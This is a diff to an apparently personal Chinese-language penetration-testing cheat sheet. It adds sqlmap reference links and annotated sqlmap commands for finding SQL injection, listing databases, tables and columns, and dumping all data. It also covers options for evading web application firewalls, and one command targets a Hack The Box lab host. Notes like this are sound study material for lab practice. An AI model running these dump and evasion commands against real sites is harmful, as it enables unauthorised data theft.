@@ -27,11 +27,99 @@ date: 2024-02-07
 
 ### Injection
 #### SQLi
-* [SQLMAP1](https://ithelp.ithome.com.tw/articles/10249487)
-* [SQLMAP2](https://ithelp.ithome.com.tw/articles/10202811)
+* [ Day 4 很像走迷宮的sqlmap ](https://ithelp.ithome.com.tw/articles/10202811)
+* [SQLmap 基本使用](https://hackmd.io/@bttea/sqlmap_common_parameters) ← 解釋的非常好
     ```bash
     $ sudo apt install sqlmap
+    $ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="<cookie key>=<cookie value>"
     ```
+    * 基本必須參數(快速)
+        ```bash
+        # 只需確認是否可注入，並只顯示 payload 技術與後端技術
+        $ sqlmap -u "URL"
+
+        # 獲取資料庫
+        $ sqlmap -u "URL" --dbs
+
+        # 獲取資料庫所有 table
+        $ sqlmap -u "URL" -D database --tables
+
+        # 獲取指定 table 之欄位
+        $ sqlmap -u "URL" -D database -T table --columns
+
+        # 獲取指定 table 之指定欄位資料
+        $ sqlmap -u "URL" -D database -T table -C field1,field2 --dump
+
+        # 獲取指定 table 之所有欄位資料(就不要-C而已)
+        $ sqlmap -u "URL" -D database -T table --dump
+
+        # 不指定table，直接獲取該指定DB所有資料
+        $ sqlmap -u "URL" -D database --dump-all
+        ```
+    * 常用參數
+        ```text
+        # 使用隨機選擇的 HTTP User-Agent 標頭值，用於繞過 WAF
+        --random-agent
+
+        # POST data 也可注入json，看網站怎送請求，--data "{'a':1,'b':2}" 或者 --data '{"a":1,"b":2}'
+        --data "a=1&b=2"
+
+        # 使用情境通常發生在，某些登入後的頁面才有注入點，不加cookie就存取不到該網站，當然也有些網站即使沒登入，但是沒cookie一樣存取不到
+        --cookie "SESSION_ID=xxx;abc=xxx;"
+
+        # 使用情境通常是不加的話，可能會被後端或者防火牆攔截等等，如果在header中已經指定User-Agent，就別加--random-agent參數
+        --header "User-Agent: Mozilla/5.0 (Windows NT ..."
+
+        # 指定注入參數
+        -p par1,par2
+
+        # 跳過注入參數
+        --skip par1,par2
+
+        # 指定注入技術，不使用此參數，預設就是全測，有 BEUSTQ
+        # boolean error union stacked time inline-queries
+        --technique BEQU
+
+        # 指定 union select 的 column 列數，可以手動 fuzzing 出來指定
+        --union-cols 5
+
+        # 指定使用union技術時，每個欄位的值是多少
+        # 例如，假設已知cols為5，且union select 1,2,3,4,5，2跟5可回顯資料
+        # 如果我想指定注入2的位置，可以這樣下
+        # --union-values "1,*,3,4,5"
+        --union-values "1,*,3,4,5"
+
+        # 指定payload前綴
+        --prefix "'"
+
+        # 指定payload後綴
+        --suffix "-- a"
+
+        # 顯示注入過程詳細，數字越大越細，(0~6，預設是1，常用是3，手動可注入但SQLmap找不到時，可以設6協助debug)，使用情境通常發生在fuzzing時的注入
+        -v 3
+
+        # 指定後端資料庫類型，中間有空格要使用雙引號，如："Microsoft Access"
+        --dbms mysql
+
+        # 自動模式，自動選取默認預設選項
+        --batch
+
+        # 跳過防火牆檢測測試
+        --skip-waf
+
+        # 設定SQLmap注入檢測風險技術，等級1~3，預設1
+        # ps. 原本僅使用AND，會變成OR也使用，在某些注入的情境可能會洗到資料庫資料，因此請謹慎使用
+        --risk N
+
+        # 設定SQLmap注入檢測層級，預設 1，每個層級的說明如下，有關各個level做了什麼，可以去看原文章
+        --level N
+
+        # 讓SQLmap自己爬網頁上的注入點
+        --forms
+
+        # 有時候因為TLS/SSL問題會導致sqlmap連不到(但是瀏覽器又可以正常存取)，直接使用此命令即可
+        --force-ssl
+        ```
 
 #### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
 ```html
